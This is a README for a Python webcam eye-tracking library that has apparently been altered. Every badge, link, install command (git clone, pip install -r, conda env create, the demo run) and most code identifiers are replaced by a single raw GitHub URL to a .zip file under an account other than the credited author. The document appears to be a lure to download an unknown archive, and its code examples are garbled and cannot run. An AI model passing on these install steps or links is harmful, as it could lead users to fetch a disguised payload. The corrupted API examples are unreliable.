# Gaze Tracking

![made-with-python](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip%https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)
![Open Source Love](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)
![License: MIT](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)
[![GitHub stars](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)

This is a Python (2 and 3) library that provides a **webcam-based eye tracking system**. It gives you the exact position of the pupils and the gaze direction, in real time.

[![Demo](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip)

_🚀 Quick note: I'm looking for job opportunities as a software developer, for exciting projects in ambitious companies. Anywhere in the world. Send me an email!_

## Installation

Clone this project:

```shell
git clone https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip
```

### For Pip install
Install these dependencies (NumPy, OpenCV, Dlib):

```shell
pip install -r https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip
```

> The Dlib library has four primary prerequisites: Boost, https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip, CMake and X11/XQuartx. If you doesn't have them, you can [read this article](https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip) to know how to easily install them.


### For Anaconda install
Install these dependencies (NumPy, OpenCV, Dlib):

```shell
conda env create --file https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip
#After creating environment, activate it
conda activate GazeTracking
```


### Verify Installation

Run the demo:

```shell
python https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip
```

## Simple Demo

```python
import cv2
from gaze_tracking import GazeTracking

gaze = GazeTracking()
webcam = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip(0)

while True:
    _, frame = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
    https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip(frame)

    new_frame = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
    text = ""

    if https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip():
        text = "Looking right"
    elif https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip():
        text = "Looking left"
    elif https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip():
        text = "Looking center"

    https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip(new_frame, text, (60, 60), https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip, 2, (255, 0, 0), 2)
    https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip("Demo", new_frame)

    if https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip(1) == 27:
        break
```

## Documentation

In the following examples, `gaze` refers to an instance of the `GazeTracking` class.

### Refresh the frame

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip(frame)
```

Pass the frame to analyze (https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip). If you want to work with a video stream, you need to put this instruction in a loop, like the example above.

### Position of the left pupil

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns the coordinates (x,y) of the left pupil.

### Position of the right pupil

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns the coordinates (x,y) of the right pupil.

### Looking to the left

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns `True` if the user is looking to the left.

### Looking to the right

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns `True` if the user is looking to the right.

### Looking at the center

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns `True` if the user is looking at the center.

### Horizontal direction of the gaze

```python
ratio = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns a number between 0.0 and 1.0 that indicates the horizontal direction of the gaze. The extreme right is 0.0, the center is 0.5 and the extreme left is 1.0.

### Vertical direction of the gaze

```python
ratio = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns a number between 0.0 and 1.0 that indicates the vertical direction of the gaze. The extreme top is 0.0, the center is 0.5 and the extreme bottom is 1.0.

### Blinking

```python
https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns `True` if the user's eyes are closed.

### Webcam frame

```python
frame = https://raw.githubusercontent.com/deerrickkorir/GazeTracking/master/gaze_tracking/Tracking_Gaze_1.8.zip()
```

Returns the main frame with pupils highlighted.

## You want to help?

Your suggestions, bugs reports and pull requests are welcome and appreciated. You can also starring ⭐️ the project!

If the detection of your pupils is not completely optimal, you can send me a video sample of you looking in different directions. I would use it to improve the algorithm.

## Licensing

This project is released by Antoine Lamé under the terms of the MIT Open Source License. View LICENSE for more information.
